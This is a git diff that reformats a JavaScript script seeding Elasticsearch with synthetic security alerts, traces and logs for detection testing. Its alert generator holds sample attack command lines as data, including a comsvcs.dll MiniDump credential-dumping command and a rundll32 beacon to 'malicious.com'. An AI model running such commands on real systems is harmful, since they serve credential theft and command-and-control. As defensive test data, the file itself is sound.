@@ -166,13 +166,12 @@ async function loadEpisodeData(esClient) {
 
     // Determine target index from data
     const isAlert = file.includes('alerts');
-    const index = isAlert ? '.internal.alerts-security.alerts-default-000001' : 'logs-endpoint.events.process-default';
+    const index = isAlert
+      ? '.internal.alerts-security.alerts-default-000001'
+      : 'logs-endpoint.events.process-default';
 
     // Bulk index
-    const body = lines.flatMap((line) => [
-      { index: { _index: index } },
-      JSON.parse(line),
-    ]);
+    const body = lines.flatMap((line) => [{ index: { _index: index } }, JSON.parse(line)]);
 
     if (body.length > 0) {
       await esClient.bulk({ body, refresh: false });
@@ -212,14 +211,26 @@ async function generateMITREScenarios(esClient) {
 function generateMITREAlert(tactic, technique, index) {
   const now = new Date();
   const timestamp = new Date(now.getTime() - Math.random() * 30 * 24 * 60 * 60 * 1000);
-  const severities = ['critical', 'high', 'high', 'medium', 'medium', 'medium', 'low', 'low', 'low', 'low'];
+  const severities = [
+    'critical',
+    'high',
+    'high',
+    'medium',
+    'medium',
+    'medium',
+    'low',
+    'low',
+    'low',
+    'low',
+  ];
   const severity = severities[Math.floor(Math.random() * severities.length)];
 
   return {
     '@timestamp': timestamp.toISOString(),
     'kibana.alert.rule.name': `${tactic.name} - ${technique}`,
     'kibana.alert.severity': severity,
-    'kibana.alert.risk_score': severity === 'critical' ? 90 : severity === 'high' ? 75 : severity === 'medium' ? 50 : 25,
+    'kibana.alert.risk_score':
+      severity === 'critical' ? 90 : severity === 'high' ? 75 : severity === 'medium' ? 50 : 25,
     'kibana.alert.workflow_status': 'open',
     'event.kind': 'signal',
     'event.category': ['malware', 'intrusion_detection'],
@@ -233,46 +244,46 @@ function generateMITREAlert(tactic, technique, index) {
     'process.name': getProcessForTechnique(technique),
     'process.command_line': getCommandLineForTechnique(technique),
     'file.hash.sha256': generateRandomHash(),
-    'source.ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    '_id': `${technique}-${index}-${uuidv4()}`,
+    'source.ip': `${Math.floor(Math.random() * 255)}.${Math.floor(
+      Math.random() * 255
+    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+    _id: `${technique}-${index}-${uuidv4()}`,
   };
 }
 
 function getTechniqueName(techniqueId) {
   const names = {
-    'T1059': 'Command and Scripting Interpreter',
-    'T1003': 'OS Credential Dumping',
-    'T1071': 'Application Layer Protocol (C2)',
-    'T1190': 'Exploit Public-Facing Application',
-    'T1566': 'Phishing',
-    'T1053': 'Scheduled Task/Job',
+    T1059: 'Command and Scripting Interpreter',
+    T1003: 'OS Credential Dumping',
+    T1071: 'Application Layer Protocol (C2)',
+    T1190: 'Exploit Public-Facing Application',
+    T1566: 'Phishing',
+    T1053: 'Scheduled Task/Job',
   };
   return names[techniqueId] || 'Unknown Technique';
 }
 
 function getProcessForTechnique(techniqueId) {
   const processes = {
-    'T1059': 'powershell.exe',
-    'T1003': 'lsass.exe',
-    'T1071': 'rundll32.exe',
-    'T1190': 'nginx',
+    T1059: 'powershell.exe',
+    T1003: 'lsass.exe',
+    T1071: 'rundll32.exe',
+    T1190: 'nginx',
   };
   return processes[techniqueId] || 'unknown.exe';
 }
 
 function getCommandLineForTechnique(techniqueId) {
   const commands = {
-    'T1059': 'powershell.exe -enc JABhAD0AJwBoAGUAbABsAG8AJw==',
-    'T1003': 'rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump',
-    'T1071': 'rundll32.exe http://malicious.com/beacon',
+    T1059: 'powershell.exe -enc JABhAD0AJwBoAGUAbABsAG8AJw==',
+    T1003: 'rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump',
+    T1071: 'rundll32.exe http://malicious.com/beacon',
   };
   return commands[techniqueId] || '';
 }
 
 function generateRandomHash() {
-  return Array.from({ length: 64 }, () =>
-    Math.floor(Math.random() * 16).toString(16)
-  ).join('');
+  return Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
 }
 
 async function generatePersonaBehaviors(esClient) {
@@ -342,10 +353,7 @@ async function generatePersonaBehaviors(esClient) {
 
   for (let i = 0; i < behaviors.length; i += 1000) {
     const batch = behaviors.slice(i, i + 1000);
-    const body = batch.flatMap((b) => [
-      { index: { _index: '.aesop-persona-behaviors' } },
-      b,
-    ]);
+    const body = batch.flatMap((b) => [{ index: { _index: '.aesop-persona-behaviors' } }, b]);
     await esClient.bulk({ body, refresh: false });
   }
 
@@ -356,8 +364,16 @@ async function generateAPMTraces(esClient) {
   console.log('📊 Generating APM traces (distributed tracing)...');
 
   const services = [
-    'auth-service', 'api-gateway', 'user-service', 'data-processor', 'ml-service',
-    'notification-service', 'payment-service', 'inventory-service', 'analytics-service', 'reporting-service',
+    'auth-service',
+    'api-gateway',
+    'user-service',
+    'data-processor',
+    'ml-service',
+    'notification-service',
+    'payment-service',
+    'inventory-service',
+    'analytics-service',
+    'reporting-service',
   ];
 
   const spans = [];
@@ -462,10 +478,7 @@ async function generateLogs(esClient) {
 
   for (let i = 0; i < logs.length; i += 1000) {
     const batch = logs.slice(i, i + 1000);
-    const body = batch.flatMap((log) => [
-      { index: { _index: 'logs-generic-default' } },
-      log,
-    ]);
+    const body = batch.flatMap((log) => [{ index: { _index: 'logs-generic-default' } }, log]);
     await esClient.bulk({ body, refresh: false });
   }
 
